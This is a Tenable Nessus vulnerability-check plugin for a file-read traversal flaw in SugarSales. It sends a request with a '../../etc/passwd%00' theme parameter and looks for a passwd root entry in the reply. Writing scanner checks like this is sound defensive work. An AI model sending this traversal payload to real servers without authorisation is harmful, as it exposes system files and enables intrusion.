#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(15950);
 script_version("$Revision: 1.12 $");
 script_bugtraq_id(11896);
 script_osvdb_id(12361, 53335, 53336);

 script_name(english:"SugarSales Multiple Module Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running SugarSales, a customer relationship suite
written in Java and PHP." );
 script_set_attribute(attribute:"description", value:
"The remote version of this software has a vulnerability that may allow
an attacker to read arbitrary files on the remote host with the
privileges of the httpd user.  The 'Users' module, 'Calls' module and
index.php script are reported to be affected." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the newest version of this software." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/12/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/12/13");
 script_cvs_date("$Date: 2011/03/14 21:48:13 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 
 script_summary(english:"Checks for a file reading flaw in SugarSales");
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2011 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# Check starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir ( cgi_dirs() )
{
 w = http_send_recv3(method:"GET", port:port, item:dir + "/sugarcrm/modules/Users/Login.php?theme=../../../../../../../etc/passwd%00");
 if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
 res = strcat(w[0], w[1], '\r\n', w[2]);
 if ( egrep(pattern:"root:.*:0:[01]:.*:.*:", string:res) )
 {
	 security_warning(port);
	 exit(0);
 }
}
